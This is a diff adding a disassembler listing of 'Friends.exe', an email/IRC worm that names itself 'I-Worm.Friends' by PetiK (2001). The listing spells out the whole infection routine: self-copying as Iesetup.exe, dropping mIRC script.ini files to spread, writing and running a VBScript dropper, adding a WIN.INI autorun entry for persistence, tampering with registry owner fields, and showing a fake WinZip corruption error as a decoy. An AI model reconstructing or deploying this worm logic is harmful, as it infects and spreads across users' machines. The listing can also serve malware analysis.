@@ -1,0 +1,731 @@
+Disassembly of File: Friends.exe
+Code Offset = 00000600, Code Size = 00000400
+Data Offset = 00000A00, Data Size = 00000600
+
+Number of Objects = 0005 (dec), Imagebase = 00400000h
+
+   Object01: CODE     RVA: 00001000 Offset: 00000600 Size: 00000400 Flags: 60000020
+   Object02: DATA     RVA: 00002000 Offset: 00000A00 Size: 00000600 Flags: C0000040
+   Object03: .idata   RVA: 00003000 Offset: 00001000 Size: 00000400 Flags: C0000040
+   Object04: .reloc   RVA: 00004000 Offset: 00001400 Size: 00000200 Flags: 50000040
+   Object05: .rsrc    RVA: 00005000 Offset: 00001600 Size: 00000400 Flags: D0000040
+
+
++++++++++++++++++++ MENU INFORMATION ++++++++++++++++++
+
+        There Are No Menu Resources in This Application
+
++++++++++++++++++ DIALOG INFORMATION ++++++++++++++++++
+
+        There Are No Dialog Resources in This Application
+
++++++++++++++++++++ IMPORTED FUNCTIONS ++++++++++++++++++
+Number of Imported Modules =    3 (decimal)
+
+   Import Module 001: KERNEL32.dll
+   Import Module 002: USER32.dll
+   Import Module 003: ADVAPI32.dll
+
++++++++++++++++++++ IMPORT MODULE DETAILS +++++++++++++++
+
+   Import Module 001: KERNEL32.dll
+
+ Addr:0000311E hint(0000) Name: WritePrivateProfileStringA
+ Addr:0000313C hint(0000) Name: lstrcat
+ Addr:00003146 hint(0000) Name: GetModuleFileNameA
+ Addr:0000315C hint(0000) Name: CopyFileA
+ Addr:00003168 hint(0000) Name: CreateDirectoryA
+ Addr:0000317C hint(0000) Name: CreateFileA
+ Addr:0000318A hint(0000) Name: ExitProcess
+ Addr:00003198 hint(0000) Name: CloseHandle
+ Addr:000031A6 hint(0000) Name: GetModuleHandleA
+ Addr:000031BA hint(0000) Name: GetSystemDirectoryA
+ Addr:000031D0 hint(0000) Name: GetSystemTime
+ Addr:000031E0 hint(0000) Name: GetWindowsDirectoryA
+ Addr:000031F8 hint(0000) Name: WinExec
+ Addr:00003202 hint(0000) Name: WriteFile
+
+   Import Module 002: USER32.dll
+
+ Addr:0000320E hint(0000) Name: MessageBoxA
+
+   Import Module 003: ADVAPI32.dll
+
+ Addr:0000321C hint(0000) Name: RegSetValueExA
+ Addr:0000322E hint(0000) Name: RegOpenKeyExA
+ Addr:0000323E hint(0000) Name: RegCloseKey
+
++++++++++++++++++++ EXPORTED FUNCTIONS ++++++++++++++++++
+Number of Exported Functions = 0000 (decimal)
+
+
+
+
++++++++++++++++++++ ASSEMBLY CODE LISTING ++++++++++++++++++
+//********************** Start of Code in Object CODE **************
+Program Entry Point = 00401000 (Friends.exe File Offset:00001A00)
+
+
+
+//******************** Program Entry Point ********
+:00401000 6A32                    push 00000032
+:00401002 68C1224000              push 004022C1
+
+* Reference To: KERNEL32.GetSystemDirectoryA, Ord:0000h
+                                  |
+:00401007 E820020000              Call 0040122C
+
+* Possible StringData Ref from Data Obj ->"\Iesetup.exe"
+                                  |
+:0040100C 68B8204000              push 004020B8
+:00401011 68C1224000              push 004022C1
+
+* Reference To: KERNEL32.lstrcat, Ord:0000h
+                                  |
+:00401016 E8E1010000              Call 004011FC
+:0040101B 6A32                    push 00000032
+:0040101D 6832204000              push 00402032
+
+* Reference To: KERNEL32.GetWindowsDirectoryA, Ord:0000h
+                                  |
+:00401022 E811020000              Call 00401238
+
+* Possible StringData Ref from Data Obj ->"\petik"
+                                  |
+:00401027 68C5204000              push 004020C5
+:0040102C 6832204000              push 00402032
+
+* Reference To: KERNEL32.lstrcat, Ord:0000h
+                                  |
+:00401031 E8C6010000              Call 004011FC
+:00401036 6A00                    push 00000000
+:00401038 6A01                    push 00000001
+:0040103A 6A01                    push 00000001
+:0040103C 6A00                    push 00000000
+:0040103E 6A01                    push 00000001
+:00401040 6800000040              push 40000000
+:00401045 6832204000              push 00402032
+
+* Reference To: KERNEL32.CreateFileA, Ord:0000h
+                                  |
+:0040104A E8C5010000              Call 00401214
+:0040104F 83F8FF                  cmp eax, FFFFFFFF
+:00401052 0F8417010000            je 0040116F
+:00401058 A396204000              mov dword ptr [00402096], eax
+:0040105D 6A00                    push 00000000
+:0040105F 689E204000              push 0040209E
+:00401064 688D000000              push 0000008D
+
+* Possible StringData Ref from Data Obj ->"[script]"
+                                  |
+:00401069 686D224000              push 0040226D
+:0040106E FF3596204000            push dword ptr [00402096]
+
+* Reference To: KERNEL32.WriteFile, Ord:0000h
+                                  |
+:00401074 E8CB010000              Call 00401244
+:00401079 FF3596204000            push dword ptr [00402096]
+
+* Reference To: KERNEL32.CloseHandle, Ord:0000h
+                                  |
+:0040107F E89C010000              Call 00401220
+:00401084 6A00                    push 00000000
+
+* Possible StringData Ref from Data Obj ->"C:\mirc\script.ini"
+                                  |
+:00401086 68CC204000              push 004020CC
+:0040108B 6832204000              push 00402032
+
+* Reference To: KERNEL32.CopyFileA, Ord:0000h
+                                  |
+:00401090 E873010000              Call 00401208
+:00401095 6A00                    push 00000000
+
+* Possible StringData Ref from Data Obj ->"C:\mirc32\script.ini"
+                                  |
+:00401097 68DF204000              push 004020DF
+:0040109C 6832204000              push 00402032
+
+* Reference To: KERNEL32.CopyFileA, Ord:0000h
+                                  |
+:004010A1 E862010000              Call 00401208
+:004010A6 6A00                    push 00000000
+
+* Possible StringData Ref from Data Obj ->"C:\Friends"
+                                  |
+:004010A8 6808214000              push 00402108
+
+* Reference To: KERNEL32.CreateDirectoryA, Ord:0000h
+                                  |
+:004010AD E85C010000              Call 0040120E
+:004010B2 6A00                    push 00000000
+:004010B4 6A01                    push 00000001
+:004010B6 6A02                    push 00000002
+:004010B8 6A00                    push 00000000
+:004010BA 6A01                    push 00000001
+:004010BC 6800000040              push 40000000
+
+* Possible StringData Ref from Data Obj ->"C:\Friends\maya.vbs"
+                                  |
+:004010C1 68F4204000              push 004020F4
+
+* Reference To: KERNEL32.CreateFileA, Ord:0000h
+                                  |
+:004010C6 E849010000              Call 00401214
+:004010CB A396204000              mov dword ptr [00402096], eax
+:004010D0 6A00                    push 00000000
+:004010D2 689E204000              push 0040209E
+:004010D7 6896020000              push 00000296
+
+* Possible StringData Ref from Data Obj ->"Set fso=CreateObject("Scripting.FileSystemObje"
+                                        ->"ct")"
+                                  |
+:004010DC 68FA224000              push 004022FA
+:004010E1 FF3596204000            push dword ptr [00402096]
+
+* Reference To: KERNEL32.WriteFile, Ord:0000h
+                                  |
+:004010E7 E858010000              Call 00401244
+:004010EC FF3596204000            push dword ptr [00402096]
+
+* Reference To: KERNEL32.CloseHandle, Ord:0000h
+                                  |
+:004010F2 E829010000              Call 00401220
+:004010F7 6A01                    push 00000001
+
+* Possible StringData Ref from Data Obj ->"wscript C:\Friends\maya.vbs"
+                                  |
+:004010F9 6841224000              push 00402241
+
+* Reference To: KERNEL32.WinExec, Ord:0000h
+                                  |
+:004010FE E83B010000              Call 0040123E
+:00401103 6A00                    push 00000000
+
+* Reference To: KERNEL32.GetModuleHandleA, Ord:0000h
+                                  |
+:00401105 E81C010000              Call 00401226
+:0040110A 6A32                    push 00000032
+:0040110C 6800204000              push 00402000
+:00401111 50                      push eax
+
+* Reference To: KERNEL32.GetModuleFileNameA, Ord:0000h
+                                  |
+:00401112 E8EB000000              Call 00401202
+:00401117 6A00                    push 00000000
+:00401119 68C1224000              push 004022C1
+:0040111E 6800204000              push 00402000
+
+* Reference To: KERNEL32.CopyFileA, Ord:0000h
+                                  |
+:00401123 E8E0000000              Call 00401208
+:00401128 6A50                    push 00000050
+:0040112A 6864204000              push 00402064
+
+* Reference To: KERNEL32.GetWindowsDirectoryA, Ord:0000h
+                                  |
+:0040112F E804010000              Call 00401238
+
+* Possible StringData Ref from Data Obj ->"\\WIN.INI"
+                                  |
+:00401134 68A2204000              push 004020A2
+:00401139 6864204000              push 00402064
+
+* Reference To: KERNEL32.lstrcat, Ord:0000h
+                                  |
+:0040113E E8B9000000              Call 004011FC
+:00401143 6864204000              push 00402064
+:00401148 68C1224000              push 004022C1
+
+* Possible StringData Ref from Data Obj ->"run"
+                                  |
+:0040114D 68AC204000              push 004020AC
+
+* Possible StringData Ref from Data Obj ->"windows"
+                                  |
+:00401152 68B0204000              push 004020B0
+
+* Reference To: KERNEL32.WritePrivateProfileStringA, Ord:0000h
+                                  |
+:00401157 E89A000000              Call 004011F6
+:0040115C 6A10                    push 00000010
+
+* Possible StringData Ref from Data Obj ->"WinZip Self-Extractor"
+                                  |
+:0040115E 688D214000              push 0040218D
+
+* Possible StringData Ref from Data Obj ->"WinZip Self-Extractor header corrupt. "
+                                        ->"Possible cause: bad disk or file "
+                                        ->"transfer error"
+                                  |
+:00401163 68A3214000              push 004021A3
+:00401168 6A00                    push 00000000
+
+* Reference To: USER32.MessageBoxA, Ord:0000h
+                                  |
+:0040116A E8DB000000              Call 0040124A
+
+* Referenced by a (U)nconditional or (C)onditional Jump at Address:
+|:00401052(C)
+|
+:0040116F 689A204000              push 0040209A
+:00401174 6A02                    push 00000002
+:00401176 6A00                    push 00000000
+
+* Possible StringData Ref from Data Obj ->"Software\Microsoft\Windows\CurrentVersion"
+                                  |
+:00401178 6863214000              push 00402163
+:0040117D 6802000080              push 80000002
+
+* Reference To: ADVAPI32.RegOpenKeyExA, Ord:0000h
+                                  |
+:00401182 E8CF000000              Call 00401256
+:00401187 6A02                    push 00000002
+
+* Possible StringData Ref from Data Obj ->"Maya, Laurent, Etienne"
+                                  |
+:00401189 6823214000              push 00402123
+:0040118E 6A01                    push 00000001
+:00401190 6A00                    push 00000000
+
+* Possible StringData Ref from Data Obj ->"RegisteredOwner"
+                                  |
+:00401192 6813214000              push 00402113
+:00401197 FF359A204000            push dword ptr [0040209A]
+
+* Reference To: ADVAPI32.RegSetValueExA, Ord:0000h
+                                  |
+:0040119D E8AE000000              Call 00401250
+:004011A2 6A02                    push 00000002
+
+* Possible StringData Ref from Data Obj ->"PetiK Corporation"
+                                  |
+:004011A4 6851214000              push 00402151
+:004011A9 6A01                    push 00000001
+:004011AB 6A00                    push 00000000
+
+* Possible StringData Ref from Data Obj ->"RegisteredOrganization"
+                                  |
+:004011AD 683A214000              push 0040213A
+:004011B2 FF359A204000            push dword ptr [0040209A]
+
+* Reference To: ADVAPI32.RegSetValueExA, Ord:0000h
+                                  |
+:004011B8 E893000000              Call 00401250
+:004011BD FF359A204000            push dword ptr [0040209A]
+
+* Reference To: ADVAPI32.RegCloseKey, Ord:0000h
+                                  |
+:004011C3 E894000000              Call 0040125C
+:004011C8 685D224000              push 0040225D
+
+* Reference To: KERNEL32.GetSystemTime, Ord:0000h
+                                  |
+:004011CD E860000000              Call 00401232
+:004011D2 66833D6322400005        cmp word ptr [00402263], 0005
+:004011DA 7513                    jne 004011EF
+:004011DC 6A40                    push 00000040
+
+* Possible StringData Ref from Data Obj ->"I-Worm.Friends"
+                                  |
+:004011DE 68F9214000              push 004021F9
+
+* Possible StringData Ref from Data Obj ->"Coded by PetiK (c)2001"
+                                  |
+:004011E3 6808224000              push 00402208
+:004011E8 6A00                    push 00000000
+
+* Reference To: USER32.MessageBoxA, Ord:0000h
+                                  |
+:004011EA E85B000000              Call 0040124A
+
+* Referenced by a (U)nconditional or (C)onditional Jump at Address:
+|:004011DA(C)
+|
+:004011EF 6A00                    push 00000000
+
+* Reference To: KERNEL32.ExitProcess, Ord:0000h
+                                  |
+:004011F1 E824000000              Call 0040121A
+
+* Referenced by a CALL at Address:
+|:00401157   
+|
+
+* Reference To: KERNEL32.WritePrivateProfileStringA, Ord:0000h
+                                  |
+:004011F6 FF25A4304000            Jmp dword ptr [004030A4]
+
+* Referenced by a CALL at Addresses:
+|:00401016   , :00401031   , :0040113E   
+|
+
+* Reference To: KERNEL32.lstrcat, Ord:0000h
+                                  |
+:004011FC FF25A8304000            Jmp dword ptr [004030A8]
+
+* Referenced by a CALL at Address:
+|:00401112   
+|
+
+* Reference To: KERNEL32.GetModuleFileNameA, Ord:0000h
+                                  |
+:00401202 FF25AC304000            Jmp dword ptr [004030AC]
+
+* Referenced by a CALL at Addresses:
+|:00401090   , :004010A1   , :00401123   
+|
+
+* Reference To: KERNEL32.CopyFileA, Ord:0000h
+                                  |
+:00401208 FF25B0304000            Jmp dword ptr [004030B0]
+
+* Referenced by a CALL at Address:
+|:004010AD   
+|
+
+* Reference To: KERNEL32.CreateDirectoryA, Ord:0000h
+                                  |
+:0040120E FF25B4304000            Jmp dword ptr [004030B4]
+
+* Referenced by a CALL at Addresses:
+|:0040104A   , :004010C6   
+|
+
+* Reference To: KERNEL32.CreateFileA, Ord:0000h
+                                  |
+:00401214 FF25B8304000            Jmp dword ptr [004030B8]
+
+* Referenced by a CALL at Address:
+|:004011F1   
+|
+
+* Reference To: KERNEL32.ExitProcess, Ord:0000h
+                                  |
+:0040121A FF25BC304000            Jmp dword ptr [004030BC]
+
+* Referenced by a CALL at Addresses:
+|:0040107F   , :004010F2   
+|
+
+* Reference To: KERNEL32.CloseHandle, Ord:0000h
+                                  |
+:00401220 FF25C0304000            Jmp dword ptr [004030C0]
+
+* Referenced by a CALL at Address:
+|:00401105   
+|
+
+* Reference To: KERNEL32.GetModuleHandleA, Ord:0000h
+                                  |
+:00401226 FF25C4304000            Jmp dword ptr [004030C4]
+
+* Referenced by a CALL at Address:
+|:00401007   
+|
+
+* Reference To: KERNEL32.GetSystemDirectoryA, Ord:0000h
+                                  |
+:0040122C FF25C8304000            Jmp dword ptr [004030C8]
+
+* Referenced by a CALL at Address:
+|:004011CD   
+|
+
+* Reference To: KERNEL32.GetSystemTime, Ord:0000h
+                                  |
+:00401232 FF25CC304000            Jmp dword ptr [004030CC]
+
+* Referenced by a CALL at Addresses:
+|:00401022   , :0040112F   
+|
+
+* Reference To: KERNEL32.GetWindowsDirectoryA, Ord:0000h
+                                  |
+:00401238 FF25D0304000            Jmp dword ptr [004030D0]
+
+* Referenced by a CALL at Address:
+|:004010FE   
+|
+
+* Reference To: KERNEL32.WinExec, Ord:0000h
+                                  |
+:0040123E FF25D4304000            Jmp dword ptr [004030D4]
+
+* Referenced by a CALL at Addresses:
+|:00401074   , :004010E7   
+|
+
+* Reference To: KERNEL32.WriteFile, Ord:0000h
+                                  |
+:00401244 FF25D8304000            Jmp dword ptr [004030D8]
+
+* Referenced by a CALL at Addresses:
+|:0040116A   , :004011EA   
+|
+
+* Reference To: USER32.MessageBoxA, Ord:0000h
+                                  |
+:0040124A FF25E0304000            Jmp dword ptr [004030E0]
+
+* Referenced by a CALL at Addresses:
+|:0040119D   , :004011B8   
+|
+
+* Reference To: ADVAPI32.RegSetValueExA, Ord:0000h
+                                  |
+:00401250 FF25E8304000            Jmp dword ptr [004030E8]
+
+* Referenced by a CALL at Address:
+|:00401182   
+|
+
+* Reference To: ADVAPI32.RegOpenKeyExA, Ord:0000h
+                                  |
+:00401256 FF25EC304000            Jmp dword ptr [004030EC]
+
+* Reference To: ADVAPI32.RegCloseKey, Ord:0000h
+                                  |
+:0040125C FF25F0304000            Jmp dword ptr [004030F0]
+:00401262 00000000000000000000    BYTE 10 DUP(0)
+:0040126C 00000000000000000000    BYTE 10 DUP(0)
+:00401276 00000000000000000000    BYTE 10 DUP(0)
+:00401280 00000000000000000000    BYTE 10 DUP(0)
+:0040128A 00000000000000000000    BYTE 10 DUP(0)
+:00401294 00000000000000000000    BYTE 10 DUP(0)
+:0040129E 00000000000000000000    BYTE 10 DUP(0)
+:004012A8 00000000000000000000    BYTE 10 DUP(0)
+:004012B2 00000000000000000000    BYTE 10 DUP(0)
+:004012BC 00000000000000000000    BYTE 10 DUP(0)
+:004012C6 00000000000000000000    BYTE 10 DUP(0)
+:004012D0 00000000000000000000    BYTE 10 DUP(0)
+:004012DA 00000000000000000000    BYTE 10 DUP(0)
+:004012E4 00000000000000000000    BYTE 10 DUP(0)
+:004012EE 00000000000000000000    BYTE 10 DUP(0)
+:004012F8 00000000000000000000    BYTE 10 DUP(0)
+:00401302 00000000000000000000    BYTE 10 DUP(0)
+:0040130C 00000000000000000000    BYTE 10 DUP(0)
+:00401316 00000000000000000000    BYTE 10 DUP(0)
+:00401320 00000000000000000000    BYTE 10 DUP(0)
+:0040132A 00000000000000000000    BYTE 10 DUP(0)
+:00401334 00000000000000000000    BYTE 10 DUP(0)
+:0040133E 00000000000000000000    BYTE 10 DUP(0)
+:00401348 00000000000000000000    BYTE 10 DUP(0)
+:00401352 00000000000000000000    BYTE 10 DUP(0)
+:0040135C 00000000000000000000    BYTE 10 DUP(0)
+:00401366 00000000000000000000    BYTE 10 DUP(0)
+:00401370 00000000000000000000    BYTE 10 DUP(0)
+:0040137A 00000000000000000000    BYTE 10 DUP(0)
+:00401384 00000000000000000000    BYTE 10 DUP(0)
+:0040138E 00000000000000000000    BYTE 10 DUP(0)
+:00401398 00000000000000000000    BYTE 10 DUP(0)
+:004013A2 00000000000000000000    BYTE 10 DUP(0)
+:004013AC 00000000000000000000    BYTE 10 DUP(0)
+:004013B6 00000000000000000000    BYTE 10 DUP(0)
+:004013C0 00000000000000000000    BYTE 10 DUP(0)
+:004013CA 00000000000000000000    BYTE 10 DUP(0)
+:004013D4 00000000000000000000    BYTE 10 DUP(0)
+:004013DE 00000000000000000000    BYTE 10 DUP(0)
+:004013E8 00000000000000000000    BYTE 10 DUP(0)
+:004013F2 00000000000000000000    BYTE 10 DUP(0)
+:004013FC 00000000000000000000    BYTE 10 DUP(0)
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+:FFFFFFFF    End Of Listing
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
